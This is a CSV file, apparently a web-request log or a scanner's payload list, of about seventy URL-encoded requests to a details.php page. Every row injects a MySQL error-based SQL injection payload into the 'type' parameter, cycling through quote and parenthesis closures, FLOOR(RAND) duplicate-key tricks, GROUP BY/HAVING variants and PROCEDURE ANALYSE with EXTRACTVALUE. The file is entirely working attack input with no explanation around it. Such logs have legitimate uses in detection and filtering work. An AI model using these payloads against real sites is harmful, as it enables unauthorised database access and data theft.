full_url,repeat_count
/details.php?prod=5&type=2%27%20OR%20ROW%281542%2C5129%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176787171%2C%28SELECT%20%28ELT%281542%3D1542%2C1%29%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%209664%20UNION%20SELECT%202716%20UNION%20SELECT%207907%20UNION%20SELECT%203361%29a%20GROUP%20BY%20x%29--%20sEsF,1649
/details.php?prod=5&type=2%22%20OR%20ROW%281542%2C5129%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176787171%2C%28SELECT%20%28ELT%281542%3D1542%2C1%29%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%209664%20UNION%20SELECT%202716%20UNION%20SELECT%207907%20UNION%20SELECT%203361%29a%20GROUP%20BY%20x%29--%20RdhU,1650
/details.php?prod=5&type=2%27%29%20OR%20ROW%281542%2C5129%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176787171%2C%28SELECT%20%28ELT%281542%3D1542%2C1%29%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%209664%20UNION%20SELECT%202716%20UNION%20SELECT%207907%20UNION%20SELECT%203361%29a%20GROUP%20BY%20x%29%20AND%20%28%27Wwkq%27%3D%27Wwkq,1651
/details.php?prod=5&type=2%27%29%29%20OR%20ROW%281542%2C5129%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176787171%2C%28SELECT%20%28ELT%281542%3D1542%2C1%29%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%209664%20UNION%20SELECT%202716%20UNION%20SELECT%207907%20UNION%20SELECT%203361%29a%20GROUP%20BY%20x%29%20AND%20%28%28%27JZpr%27%3D%27JZpr,1652
/details.php?prod=5&type=2%27%29%29%29%20OR%20ROW%281542%2C5129%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176787171%2C%28SELECT%20%28ELT%281542%3D1542%2C1%29%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%209664%20UNION%20SELECT%202716%20UNION%20SELECT%207907%20UNION%20SELECT%203361%29a%20GROUP%20BY%20x%29%20AND%20%28%28%28%27HMbE%27%3D%27HMbE,1653
/details.php?prod=5&type=2%27%20OR%20ROW%281542%2C5129%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176787171%2C%28SELECT%20%28ELT%281542%3D1542%2C1%29%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%209664%20UNION%20SELECT%202716%20UNION%20SELECT%207907%20UNION%20SELECT%203361%29a%20GROUP%20BY%20x%29%20AND%20%27uEfe%27%3D%27uEfe,1654
/details.php?prod=5&type=2%27%29%20OR%20ROW%281542%2C5129%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176787171%2C%28SELECT%20%28ELT%281542%3D1542%2C1%29%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%209664%20UNION%20SELECT%202716%20UNION%20SELECT%207907%20UNION%20SELECT%203361%29a%20GROUP%20BY%20x%29%20AND%20%28%27dqGq%27%20LIKE%20%27dqGq,1655
/details.php?prod=5&type=2%27%29%29%20OR%20ROW%281542%2C5129%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176787171%2C%28SELECT%20%28ELT%281542%3D1542%2C1%29%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%209664%20UNION%20SELECT%202716%20UNION%20SELECT%207907%20UNION%20SELECT%203361%29a%20GROUP%20BY%20x%29%20AND%20%28%28%27YIgs%27%20LIKE%20%27YIgs,1656
/details.php?prod=5&type=2%27%29%29%29%20OR%20ROW%281542%2C5129%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176787171%2C%28SELECT%20%28ELT%281542%3D1542%2C1%29%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%209664%20UNION%20SELECT%202716%20UNION%20SELECT%207907%20UNION%20SELECT%203361%29a%20GROUP%20BY%20x%29%20AND%20%28%28%28%27Xrnx%27%20LIKE%20%27Xrnx,1657
/details.php?prod=5&type=2%25%27%20OR%20ROW%281542%2C5129%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176787171%2C%28SELECT%20%28ELT%281542%3D1542%2C1%29%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%209664%20UNION%20SELECT%202716%20UNION%20SELECT%207907%20UNION%20SELECT%203361%29a%20GROUP%20BY%20x%29%20AND%20%27rITE%25%27%3D%27rITE,1658
/details.php?prod=5&type=2%27%20OR%20ROW%281542%2C5129%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176787171%2C%28SELECT%20%28ELT%281542%3D1542%2C1%29%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%209664%20UNION%20SELECT%202716%20UNION%20SELECT%207907%20UNION%20SELECT%203361%29a%20GROUP%20BY%20x%29%20AND%20%27OezH%27%20LIKE%20%27OezH,1659
/details.php?prod=5&type=2%22%29%20OR%20ROW%281542%2C5129%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176787171%2C%28SELECT%20%28ELT%281542%3D1542%2C1%29%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%209664%20UNION%20SELECT%202716%20UNION%20SELECT%207907%20UNION%20SELECT%203361%29a%20GROUP%20BY%20x%29%20AND%20%28%22cXpM%22%3D%22cXpM,1660
/details.php?prod=5&type=2%22%29%29%20OR%20ROW%281542%2C5129%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176787171%2C%28SELECT%20%28ELT%281542%3D1542%2C1%29%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%209664%20UNION%20SELECT%202716%20UNION%20SELECT%207907%20UNION%20SELECT%203361%29a%20GROUP%20BY%20x%29%20AND%20%28%28%22xLmc%22%3D%22xLmc,1661
/details.php?prod=5&type=2%22%29%29%29%20OR%20ROW%281542%2C5129%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176787171%2C%28SELECT%20%28ELT%281542%3D1542%2C1%29%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%209664%20UNION%20SELECT%202716%20UNION%20SELECT%207907%20UNION%20SELECT%203361%29a%20GROUP%20BY%20x%29%20AND%20%28%28%28%22BHGw%22%3D%22BHGw,1662
/details.php?prod=5&type=2%22%20OR%20ROW%281542%2C5129%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176787171%2C%28SELECT%20%28ELT%281542%3D1542%2C1%29%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%209664%20UNION%20SELECT%202716%20UNION%20SELECT%207907%20UNION%20SELECT%203361%29a%20GROUP%20BY%20x%29%20AND%20%22oeLG%22%3D%22oeLG,1663
/details.php?prod=5&type=2%22%29%20OR%20ROW%281542%2C5129%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176787171%2C%28SELECT%20%28ELT%281542%3D1542%2C1%29%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%209664%20UNION%20SELECT%202716%20UNION%20SELECT%207907%20UNION%20SELECT%203361%29a%20GROUP%20BY%20x%29%20AND%20%28%22fcCj%22%20LIKE%20%22fcCj,1664
/details.php?prod=5&type=2%22%29%29%20OR%20ROW%281542%2C5129%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176787171%2C%28SELECT%20%28ELT%281542%3D1542%2C1%29%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%209664%20UNION%20SELECT%202716%20UNION%20SELECT%207907%20UNION%20SELECT%203361%29a%20GROUP%20BY%20x%29%20AND%20%28%28%22JUFk%22%20LIKE%20%22JUFk,1665
/details.php?prod=5&type=2%22%29%29%29%20OR%20ROW%281542%2C5129%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176787171%2C%28SELECT%20%28ELT%281542%3D1542%2C1%29%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%209664%20UNION%20SELECT%202716%20UNION%20SELECT%207907%20UNION%20SELECT%203361%29a%20GROUP%20BY%20x%29%20AND%20%28%28%28%22HPly%22%20LIKE%20%22HPly,1666
/details.php?prod=5&type=2%22%20OR%20ROW%281542%2C5129%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176787171%2C%28SELECT%20%28ELT%281542%3D1542%2C1%29%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%209664%20UNION%20SELECT%202716%20UNION%20SELECT%207907%20UNION%20SELECT%203361%29a%20GROUP%20BY%20x%29%20AND%20%22vVJv%22%20LIKE%20%22vVJv,1667
/details.php?prod=5&type=2%27%20OR%20ROW%281542%2C5129%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176787171%2C%28SELECT%20%28ELT%281542%3D1542%2C1%29%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%209664%20UNION%20SELECT%202716%20UNION%20SELECT%207907%20UNION%20SELECT%203361%29a%20GROUP%20BY%20x%29%20OR%20%27kGqw%27%3D%27pgcB,1668
/details.php?prod=5&type=2%27%29%20WHERE%205207%3D5207%20OR%20ROW%281542%2C5129%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176787171%2C%28SELECT%20%28ELT%281542%3D1542%2C1%29%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%209664%20UNION%20SELECT%202716%20UNION%20SELECT%207907%20UNION%20SELECT%203361%29a%20GROUP%20BY%20x%29--%20WwBE,1669
/details.php?prod=5&type=2%22%29%20WHERE%207538%3D7538%20OR%20ROW%281542%2C5129%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176787171%2C%28SELECT%20%28ELT%281542%3D1542%2C1%29%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%209664%20UNION%20SELECT%202716%20UNION%20SELECT%207907%20UNION%20SELECT%203361%29a%20GROUP%20BY%20x%29--%20Cjqp,1670
/details.php?prod=5&type=2%27%20WHERE%202389%3D2389%20OR%20ROW%281542%2C5129%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176787171%2C%28SELECT%20%28ELT%281542%3D1542%2C1%29%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%209664%20UNION%20SELECT%202716%20UNION%20SELECT%207907%20UNION%20SELECT%203361%29a%20GROUP%20BY%20x%29--%20EKpV,1671
/details.php?prod=5&type=2%22%20WHERE%208172%3D8172%20OR%20ROW%281542%2C5129%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176787171%2C%28SELECT%20%28ELT%281542%3D1542%2C1%29%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%209664%20UNION%20SELECT%202716%20UNION%20SELECT%207907%20UNION%20SELECT%203361%29a%20GROUP%20BY%20x%29--%20zKkP,1672
/details.php?prod=5&type=2%27%7C%7C%28SELECT%200x466f5758%20WHERE%206260%3D6260%20OR%20ROW%281542%2C5129%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176787171%2C%28SELECT%20%28ELT%281542%3D1542%2C1%29%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%209664%20UNION%20SELECT%202716%20UNION%20SELECT%207907%20UNION%20SELECT%203361%29a%20GROUP%20BY%20x%29%29%7C%7C%27,1673
/details.php?prod=5&type=2%27%7C%7C%28SELECT%200x66686c4b%20FROM%20DUAL%20WHERE%207611%3D7611%20OR%20ROW%281542%2C5129%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176787171%2C%28SELECT%20%28ELT%281542%3D1542%2C1%29%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%209664%20UNION%20SELECT%202716%20UNION%20SELECT%207907%20UNION%20SELECT%203361%29a%20GROUP%20BY%20x%29%29%7C%7C%27,1674
/details.php?prod=5&type=2%27%2B%28SELECT%200x6b757256%20WHERE%205818%3D5818%20OR%20ROW%281542%2C5129%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176787171%2C%28SELECT%20%28ELT%281542%3D1542%2C1%29%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%209664%20UNION%20SELECT%202716%20UNION%20SELECT%207907%20UNION%20SELECT%203361%29a%20GROUP%20BY%20x%29%29%2B%27,1675
/details.php?prod=5&type=2%7C%7C%28SELECT%200x70435862%20FROM%20DUAL%20WHERE%202980%3D2980%20OR%20ROW%281542%2C5129%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176787171%2C%28SELECT%20%28ELT%281542%3D1542%2C1%29%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%209664%20UNION%20SELECT%202716%20UNION%20SELECT%207907%20UNION%20SELECT%203361%29a%20GROUP%20BY%20x%29%29%7C%7C,1676
/details.php?prod=5&type=2%7C%7C%28SELECT%200x57745379%20WHERE%207397%3D7397%20OR%20ROW%281542%2C5129%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176787171%2C%28SELECT%20%28ELT%281542%3D1542%2C1%29%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%209664%20UNION%20SELECT%202716%20UNION%20SELECT%207907%20UNION%20SELECT%203361%29a%20GROUP%20BY%20x%29%29%7C%7C,1677
/details.php?prod=5&type=2%2B%28SELECT%200x71556f58%20WHERE%208263%3D8263%20OR%20ROW%281542%2C5129%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176787171%2C%28SELECT%20%28ELT%281542%3D1542%2C1%29%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%209664%20UNION%20SELECT%202716%20UNION%20SELECT%207907%20UNION%20SELECT%203361%29a%20GROUP%20BY%20x%29%29%2B,1678
/details.php?prod=5&type=2%27%29%29%20AS%20qzmD%20WHERE%206423%3D6423%20OR%20ROW%281542%2C5129%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176787171%2C%28SELECT%20%28ELT%281542%3D1542%2C1%29%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%209664%20UNION%20SELECT%202716%20UNION%20SELECT%207907%20UNION%20SELECT%203361%29a%20GROUP%20BY%20x%29--%20oZDU,1679
/details.php?prod=5&type=2%22%29%29%20AS%20uGlS%20WHERE%206791%3D6791%20OR%20ROW%281542%2C5129%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176787171%2C%28SELECT%20%28ELT%281542%3D1542%2C1%29%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%209664%20UNION%20SELECT%202716%20UNION%20SELECT%207907%20UNION%20SELECT%203361%29a%20GROUP%20BY%20x%29--%20aejV,1680
/details.php?prod=5&type=2%27%29%20AS%20AEza%20WHERE%202127%3D2127%20OR%20ROW%281542%2C5129%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176787171%2C%28SELECT%20%28ELT%281542%3D1542%2C1%29%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%209664%20UNION%20SELECT%202716%20UNION%20SELECT%207907%20UNION%20SELECT%203361%29a%20GROUP%20BY%20x%29--%20ZYBs,1681
/details.php?prod=5&type=2%22%29%20AS%20WNnS%20WHERE%203762%3D3762%20OR%20ROW%281542%2C5129%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176787171%2C%28SELECT%20%28ELT%281542%3D1542%2C1%29%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%209664%20UNION%20SELECT%202716%20UNION%20SELECT%207907%20UNION%20SELECT%203361%29a%20GROUP%20BY%20x%29--%20qiGy,1682
/details.php?prod=5&type=2%22%3D%222%22%20OR%20ROW%281542%2C5129%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176787171%2C%28SELECT%20%28ELT%281542%3D1542%2C1%29%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%209664%20UNION%20SELECT%202716%20UNION%20SELECT%207907%20UNION%20SELECT%203361%29a%20GROUP%20BY%20x%29%20AND%20%222%22%3D%222,1683
/details.php?prod=5&type=2%27%20IN%20BOOLEAN%20MODE%29%20OR%20ROW%281542%2C5129%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176787171%2C%28SELECT%20%28ELT%281542%3D1542%2C1%29%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%209664%20UNION%20SELECT%202716%20UNION%20SELECT%207907%20UNION%20SELECT%203361%29a%20GROUP%20BY%20x%29%23,1684
/details.php?prod=5&type=-1396%29%20OR%201%20GROUP%20BY%20CONCAT%280x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%281139%3D1139%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29%20HAVING%20MIN%280%29%23,1685
/details.php?prod=5&type=-3329%29%29%20OR%201%20GROUP%20BY%20CONCAT%280x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%281139%3D1139%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29%20HAVING%20MIN%280%29%23,1686
/details.php?prod=5&type=-6371%29%29%29%20OR%201%20GROUP%20BY%20CONCAT%280x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%281139%3D1139%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29%20HAVING%20MIN%280%29%23,1687
/details.php?prod=5&type=-1694%20OR%201%20GROUP%20BY%20CONCAT%280x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%281139%3D1139%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29%20HAVING%20MIN%280%29%23,1688
/details.php?prod=5&type=-8810%29%20WHERE%202405%3D2405%20OR%201%20GROUP%20BY%20CONCAT%280x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%281139%3D1139%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29%20HAVING%20MIN%280%29%23,1689
/details.php?prod=5&type=-1377%20WHERE%207680%3D7680%20OR%201%20GROUP%20BY%20CONCAT%280x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%281139%3D1139%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29%20HAVING%20MIN%280%29%23,1690
/details.php?prod=5&type=-2820%29%29%20AS%20EGUX%20WHERE%206591%3D6591%20OR%201%20GROUP%20BY%20CONCAT%280x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%281139%3D1139%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29%20HAVING%20MIN%280%29%23,1691
/details.php?prod=5&type=-4662%29%20AS%20Ynmo%20WHERE%209019%3D9019%20OR%201%20GROUP%20BY%20CONCAT%280x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%281139%3D1139%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29%20HAVING%20MIN%280%29%23,1692
/details.php?prod=5&type=-4400%27%29%20OR%201%20GROUP%20BY%20CONCAT%280x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%281139%3D1139%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29%20HAVING%20MIN%280%29%23,1693
/details.php?prod=5&type=-9530%27%20OR%201%20GROUP%20BY%20CONCAT%280x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%281139%3D1139%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29%20HAVING%20MIN%280%29%23,1694
/details.php?prod=5&type=-8557%22%20OR%201%20GROUP%20BY%20CONCAT%280x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%281139%3D1139%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29%20HAVING%20MIN%280%29%23,1695
/details.php?prod=5&type=-1419%27%29%29%20OR%201%20GROUP%20BY%20CONCAT%280x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%281139%3D1139%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29%20HAVING%20MIN%280%29%23,1696
/details.php?prod=5&type=-5500%27%29%29%29%20OR%201%20GROUP%20BY%20CONCAT%280x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%281139%3D1139%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29%20HAVING%20MIN%280%29%23,1697
/details.php?prod=5&type=-2346%25%27%20OR%201%20GROUP%20BY%20CONCAT%280x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%281139%3D1139%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29%20HAVING%20MIN%280%29%23,1698
/details.php?prod=5&type=-4402%22%29%20OR%201%20GROUP%20BY%20CONCAT%280x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%281139%3D1139%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29%20HAVING%20MIN%280%29%23,1699
/details.php?prod=5&type=-9601%22%29%29%20OR%201%20GROUP%20BY%20CONCAT%280x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%281139%3D1139%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29%20HAVING%20MIN%280%29%23,1700
/details.php?prod=5&type=-3252%22%29%29%29%20OR%201%20GROUP%20BY%20CONCAT%280x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%281139%3D1139%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29%20HAVING%20MIN%280%29%23,1701
/details.php?prod=5&type=-1571%27%29%20WHERE%206033%3D6033%20OR%201%20GROUP%20BY%20CONCAT%280x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%281139%3D1139%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29%20HAVING%20MIN%280%29%23,1702
/details.php?prod=5&type=-6505%22%29%20WHERE%204492%3D4492%20OR%201%20GROUP%20BY%20CONCAT%280x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%281139%3D1139%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29%20HAVING%20MIN%280%29%23,1703
/details.php?prod=5&type=-5530%27%20WHERE%203742%3D3742%20OR%201%20GROUP%20BY%20CONCAT%280x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%281139%3D1139%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29%20HAVING%20MIN%280%29%23,1704
/details.php?prod=5&type=-9156%22%20WHERE%202339%3D2339%20OR%201%20GROUP%20BY%20CONCAT%280x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%281139%3D1139%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29%20HAVING%20MIN%280%29%23,1705
/details.php?prod=5&type=-8714%27%29%29%20AS%20UmXP%20WHERE%203274%3D3274%20OR%201%20GROUP%20BY%20CONCAT%280x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%281139%3D1139%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29%20HAVING%20MIN%280%29%23,1706
/details.php?prod=5&type=-2100%22%29%29%20AS%20ngjD%20WHERE%205468%3D5468%20OR%201%20GROUP%20BY%20CONCAT%280x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%281139%3D1139%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29%20HAVING%20MIN%280%29%23,1707
/details.php?prod=5&type=-4460%27%29%20AS%20KXxC%20WHERE%206855%3D6855%20OR%201%20GROUP%20BY%20CONCAT%280x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%281139%3D1139%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29%20HAVING%20MIN%280%29%23,1708
/details.php?prod=5&type=-1980%22%29%20AS%20JDJc%20WHERE%205583%3D5583%20OR%201%20GROUP%20BY%20CONCAT%280x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%281139%3D1139%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29%20HAVING%20MIN%280%29%23,1709
/details.php?prod=5&type=2%29%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%283763%2CCONCAT%280x5c%2C0x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%283763%3D3763%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%29%29%2C1%29--%20rvlT,1710
/details.php?prod=5&type=2%29%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%283763%2CCONCAT%280x5c%2C0x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%283763%3D3763%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%29%29%2C1%29%20AND%20%282017%3D2017,1711
/details.php?prod=5&type=2%29%29%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%283763%2CCONCAT%280x5c%2C0x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%283763%3D3763%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%29%29%2C1%29%20AND%20%28%282519%3D2519,1712
/details.php?prod=5&type=2%29%29%29%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%283763%2CCONCAT%280x5c%2C0x7176787171%2C%28SELECT%20%28CASE%20WHEN%20%283763%3D3763%29%20THEN%201%20ELSE%200%20END%29%29%2C0x7178706a71%29%29%2C1%29%20AND%20%28%28%289144%3D9144,1713
